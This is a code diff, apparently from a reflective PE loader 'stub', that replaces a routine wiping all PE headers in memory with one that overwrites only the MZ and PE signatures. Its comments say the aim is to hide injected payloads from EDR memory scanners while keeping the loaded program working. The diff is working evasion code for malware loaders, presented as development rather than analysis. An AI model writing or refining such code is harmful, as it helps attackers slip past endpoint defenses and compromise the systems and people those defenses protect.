@@ -688,50 +688,6 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
 
 
 /* ═══════════════════════════════════════════════════════════════════
- * PE header wiping — defeat memory scanners
- *
- * After the reflective loader maps the payload into memory, its PE
- * headers (MZ signature, PE signature, section table) remain at the
- * start of the allocation. EDR memory scanners walk process memory
- * looking for these signatures to find injected/reflectively loaded
- * PEs. Zeroing the first page erases all headers.
- * ═══════════════════════════════════════════════════════════════════ */
-
-static void _wipe_pe_headers(BYTE *base, RESOLVED_APIS *api) {
-    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
-    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
-    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
-
-    /* Make headers writable */
-    if (api->pNtProtectVirtualMemory) {
-        PVOID region = base;
-        SIZE_T sz = headerSize;
-        ULONG old;
-        api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
-                                     PAGE_READWRITE, &old);
-    } else {
-        DWORD old;
-        api->pVirtualProtect(base, headerSize, PAGE_READWRITE, &old);
-    }
-
-    /* Zero all headers */
-    for (DWORD i = 0; i < headerSize; i++)
-        base[i] = 0;
-
-    /* Set to no-access — makes the region invisible to memory scans */
-    if (api->pNtProtectVirtualMemory) {
-        PVOID region = base;
-        SIZE_T sz = headerSize;
-        ULONG old;
-        api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
-                                     PAGE_NOACCESS, &old);
-    }
-
-    SLOG("[stub] headers wiped");
-}
-
-
-/* ═══════════════════════════════════════════════════════════════════
  * Crash handler (debug builds)
  * ═══════════════════════════════════════════════════════════════════ */
 
@@ -1064,15 +1020,33 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     }
 #endif
 
-    /* Wipe PE headers — must happen AFTER relocs/imports/TLS but BEFORE
-     * entry point, so the payload code runs with no MZ/PE signature in
-     * memory for EDR scanners to find. Save entryRVA first since the
-     * headers will be zeroed. */
+    /* Stomp MZ/PE signatures — enough to defeat memory scanners looking
+     * for reflectively loaded PEs, but leaves the rest of the header
+     * page intact so the CRT and runtime can still read data directories,
+     * section table, etc.  Only 6 bytes are touched. */
     DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
     WORD peChars   = mappedNt->FileHeader.Characteristics;
     if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }
 
-    _wipe_pe_headers(base, api);
+    /* Stomp MZ signature (2 bytes) and PE\0\0 signature (4 bytes) */
+    {
+        PVOID region = base;
+        SIZE_T sz = mappedNt->OptionalHeader.SizeOfHeaders;
+        if (api->pNtProtectVirtualMemory) {
+            ULONG old;
+            api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
+                                         PAGE_READWRITE, &old);
+            base[0] = 0; base[1] = 0;                        /* kill MZ */
+            /* e_lfanew is still valid at this point — zero PE\0\0 sig */
+            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 0] = 0;  /* P */
+            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 1] = 0;  /* E */
+            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 2] = 0;  /* \0 */
+            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 3] = 0;  /* \0 */
+            api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
+                                         PAGE_READONLY, &old);
+        }
+        SLOG("[stub] MZ/PE signatures stomped");
+    }
 
     void *entry = base + entryRVA;
     SHEX("[stub] entry", (ULONG_PTR)entry);
